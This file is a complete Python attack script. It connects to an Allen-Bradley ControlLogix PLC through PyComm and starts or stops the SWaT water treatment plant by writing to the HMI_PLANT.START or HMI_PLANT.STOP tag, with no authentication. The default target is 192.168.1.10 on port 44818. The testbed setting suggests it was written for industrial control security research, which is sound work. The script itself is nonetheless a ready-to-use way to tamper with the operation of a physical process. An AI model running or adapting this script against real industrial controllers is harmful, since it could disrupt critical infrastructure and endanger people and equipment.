'''
swat_control_tag.py
An attack script that can control the start or stop the SWaT Plant by writing
to the tag of the PLC that controls the start and stop state using PyComm

Author: Goh Yee Kit
Email: yeek3063@gmail.com
'''
import argparse
from pycomm.ab_comm.clx import Driver as ClxDriver


def start_plant(ip, port):
    '''
    Starts the Plant.
    Writes to the HMI_PLANT.START tag
    '''
    print("HMI_PLANT.START")
    tag_name = "HMI_PLANT.START"
    tag_type = 'BOOL'
    plc = ClxDriver()

    if plc.open(ip, port):
        print("Connected to {}:{}".format(ip, port))

        # Writes 1 to register of PLC 1
        value = 1
        print("Writing {} to {} on {}".format(value, tag_name, ip))
        plc.write_tag(tag_name, value, tag_type)

        # Reads from tag of PLC 1
        print("Reading {} from {}".format(tag_name, ip))
        tagg = plc.read_tag(tag_name)
        print(tagg)

        # Writes 0 to register of PLC 1
        value = 0
        print("Writing {} to {} on {}".format(value, tag_name, ip))
        plc.write_tag(tag_name, value, tag_type)

        # Reads from tag of PLC 1
        print("Reading {} from {}".format(tag_name, ip))
        tagg = plc.read_tag(tag_name)
        print(tagg)

        # Close Connection
        plc.close()


def stop_plant(ip, port):
    '''
    Stops the Plant.
    Writes to the HMI_PLANT.STOP tag
    '''
    print("HMI_PLANT.STOP")
    tag_name = "HMI_PLANT.STOP"
    tag_type = 'BOOL'
    plc = ClxDriver()

    if plc.open(ip, port):
        print("Connected to {}:{}".format(ip, port))

        # Writes 1 to register of PLC 1
        value = 1
        print("Writing {} to {} on {}".format(value, tag_name, ip))
        plc.write_tag(tag_name, value, tag_type)

        # Reads from tag of PLC 1
        print("Reading {} from {}".format(tag_name, ip))
        tagg = plc.read_tag(tag_name)
        print(tagg)

        # Writes 0 to register of PLC 1
        value = 0
        print("Writing {} to {} on {}".format(value, tag_name, ip))
        plc.write_tag(tag_name, value, tag_type)

        # Reads from tag of PLC 1
        print("Reading {} from {}".format(tag_name, ip))
        tagg = plc.read_tag(tag_name)
        print(tagg)

        # Close Connection
        plc.close()


def get_argparse():
    '''
    Creates Arg Parse object
    '''
    parser = argparse.ArgumentParser(
        description="Python Script to Start/Stop the SWaT Plant")
    parser.add_argument(
        "function", choices=["start", "stop"],
        help="Function: [Start/Stop] the Plant")
    parser.add_argument(
        "-ip", help="IP of PLC to connect to", type=str,
        default="192.168.1.10")
    parser.add_argument(
        "-port", help="Port of PLC to connect to", type=int, default=44818)
    args = parser.parse_args()
    return args


def main():
    '''
    Main Function
    '''
    args = get_argparse()
    func = args.function
    ip = args.ip
    port = args.port
    if func == "start":
        print("Starting Plant")
        start_plant(ip, port)
    elif func == "stop":
        print("Stopping Plant")
        stop_plant(ip, port)


if __name__ == '__main__':
    main()
